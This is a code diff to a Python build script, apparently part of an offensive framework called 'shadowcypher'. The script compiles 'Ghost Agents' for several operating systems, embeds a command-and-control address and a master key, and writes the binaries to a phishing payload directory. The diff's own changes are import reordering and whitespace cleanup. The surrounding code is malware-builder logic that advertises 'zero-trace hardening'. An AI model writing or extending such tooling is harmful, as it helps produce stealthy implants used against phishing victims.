@@ -4,25 +4,27 @@
 # ==============================================================================
 # Orchestrates the secure compilation of Ghost Agents for all target platforms.
 
+import base64
 import os
 import subprocess
-import base64
-from shadowcypher.core.platform import platform_engine
+
 from shadowcypher.core.logger import logger
+from shadowcypher.core.platform import platform_engine
+
 
 def forge_agents(c2_address: str):
     """Compiles Ghost Agents for Linux, Windows, and macOS with zero-trace hardening."""
-    
+
     agent_dir = platform_engine.resolve_path("native", "ghost")
     output_dir = platform_engine.resolve_path("phish", "payloads", "ghost")
     os.makedirs(output_dir, exist_ok=True)
-    
+
     # Locate Master Key
     key_path = platform_engine.get_master_key_path()
     if not os.path.exists(key_path):
         logger.error("forge", f"Master key not found at {key_path}. Run setup script first.")
         return False
-    
+
     with open(key_path, "rb") as f:
         master_key = base64.b64encode(f.read()).decode()
 
@@ -41,7 +43,7 @@ def forge_agents(c2_address: str):
     for t in targets:
         binary_name = f"ghost_{t['os']}_{t['arch']}{t['ext']}"
         output_path = os.path.join(output_dir, binary_name)
-        
+
         env = os.environ.copy()
         env["GOOS"] = t["os"]
         env["GOARCH"] = t["arch"]
